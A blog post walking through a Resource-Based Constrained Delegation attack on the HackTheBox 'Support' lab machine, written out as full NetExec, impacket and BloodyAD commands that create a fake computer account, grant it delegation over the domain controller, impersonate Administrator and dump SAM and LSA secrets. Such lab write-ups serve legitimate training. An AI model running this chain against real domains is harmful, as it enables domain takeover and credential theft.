---
layout: post
title: "RBCD Using NXC: Resource-Based Constrained Delegation Attack"
date: 2026-01-18 14:00:00 +0000
categories: [netexec, active-directory, offensive-security, rbcd, kerberos]
description: "A practical walkthrough of exploiting Resource-Based Constrained Delegation using NetExec on HackTheBox Support machine"
---

# RBCD Using NXC

For this demo i will be using the machine Support from HackTheBox

![image.png](../assets/images/posts/rbcd/image.png)

lets resolve the domain name of the target & add it to our `/etc/hosts` file by :

```bash
❯ sudo nxc smb 10.129.251.96 -u 'Guest' -p '' --generate-hosts-file /etc/hosts
```

![image.png](../assets/images/posts/rbcd/image1.png)

### Nmap Scan

```bash
❯ rustscan -a support.htb

❯ nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49676,49679,49754 -sC -sV -Pn support.htb
```

![image.png](../assets/images/posts/rbcd/image2.png)

According to `rustscan` and `nmap` result, we have ports that are opened:

| Ports Open | Service |
| --- | --- |
| 53 | Simple DNS Plus |
| 88,464 | Kerberos |
| 135,593,49664,49668,49674,49679,49703,57579,58137 | RPC |
| 139,445 | SMB |
| 389,636,3268,3269 | LDAP |
| 5985 | WinRM |

at this stage lets say we have a set of credentials of a compromised low priv user

support : Ironside47pleasure40Watchful

lets check the machine quota first

```bash
❯ nxc ldap support.htb -u support -p 'Ironside47pleasure40Watchful' -M maq
```

![image.png](../assets/images/posts/rbcd/image3.png)

ok sweet , that means we can create a computer but first lets take a look at the bloodhound data, so first what i will do i gather the bloodhound data by :

`cargo install rusthound-ce`

[https://github.com/g0h4n/RustHound-CE](https://github.com/g0h4n/RustHound-CE)

```bash
❯ rusthound-ce -d support.htb -u support@support.htb -z -c
```

![image.png](../assets/images/posts/rbcd/image4.png)

our current owned user is `support` we will mark it as owned & check for any outbound control edges are there or not :

![image.png](../assets/images/posts/rbcd/image5.png)

![image.png](../assets/images/posts/rbcd/image6.png)

### The attack (High Level):

1. We are going to create a fake computer on the domain.
2. Configure RBCD by setting the `msds-allowedtoactonbehalfofotheridentity` to allow our computer to act on behalf of the DC.
3. Perform & S4U attack to get a kerberos ticket on behalf of the administrator.
4. Pass the admins ticket to get RCE on the target.

### Step 1 : Create a Fake Computer(Machine) account

using `impacket` :

```bash
❯ addcomputer.py -computer-name 'raj' -computer-pass 'hackme' -dc-ip 10.129.251.96 support.htb/support:Ironside47pleasure40Watchful
```

![image.png](../assets/images/posts/rbcd/image7.png)

### Alternate using BloodyAD to create a computer :

```bash
❯ bloodyAD --host 10.129.254.78 -u support -p 'Ironside47pleasure40Watchful' -d support.htb add computer 'raj' 'hackme'
```

![image.png](../assets/images/posts/rbcd/image8.png)

> **My Created Fake Computer Account - raj$ : hackme**
> 

### Step 2 : Give RBCD Rights to your fake Computer Account

using `impacket` :

```bash
❯ rbcd.py -delegate-from 'raj$' -delegate-to 'DC$' -action 'write' 'support.htb/support:Ironside47pleasure40Watchful'
```

![image.png](../assets/images/posts/rbcd/image9.png)

### Alternate - using BloodyAD to grant RBCD rights :

```bash
❯ bloodyAD --host 10.129.254.78 -u support -p 'Ironside47pleasure40Watchful' -d support.htb add rbcd 'DC$' 'raj$'
```

![image.png](../assets/images/posts/rbcd/image10.png)

### Step 3 : Get the Silver ticket of target Impersonation user (e.g Administrator) using nxc

```bash
❯ nxc smb support.htb -u 'raj$' -p 'hackme' --delegate Administrator

❯ nxc smb support.htb -u 'raj$' -p 'hackme' --delegate Administrator --sam --lsa
```

![image.png](../assets/images/posts/rbcd/image11.png)

Bling Bling , we got the silver ticket of Administrator & as well as the NT Hash of Administrator too!

### Alternate of getting silver ticket using `getST.py` Normal way :

```bash
❯ getST.py support.htb/'raj$':'hackme' -spn cifs/dc.support.htb -impersonate Administrator
```

![image.png](../assets/images/posts/rbcd/image12.png)

![image.png](../assets/images/posts/rbcd/image13.png)

Hope you enjoyed the trick!
